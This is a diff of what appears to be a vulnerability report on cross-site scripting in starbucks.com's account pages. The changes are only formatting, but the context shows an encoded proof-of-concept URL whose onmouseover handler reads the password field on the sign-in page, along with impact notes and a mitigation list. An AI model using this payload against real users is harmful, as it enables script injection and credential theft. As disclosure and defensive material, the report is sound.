@@ -29,9 +29,9 @@ https://www.starbucks.com/account/(A("%20%252fonmouseover=%22alert%25%32%38%64%6
 
 ## PoC (Credential Theft Example):
 
----
+
 https://www.starbucks.com/account/(F("%20%252fonmouseover=%22%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2567%2565%2574%2545%256c%2565%256d%2565%256e%2574%2573%2542%2579%254e%2561%256d%2565%2528%2527%2541%2563%2563%256f%2575%256e%2574%252e%2550%2561%2573%2573%2557%256f%2572%2564%2527%2529%255b%2530%255d%252e%2576%2561%256c%2575%2565%2529%22"))/signin
----
+
 ## Impact:
 1)JavaScript execution in the context of starbucks.com.
 2)Possible credential theft on the login page.
@@ -665,6 +665,7 @@ Found in: example.com/account/delete
            •Strip HTML/script tags
 
            •Block Self-XSS payload execution on client side
+
 
 
 
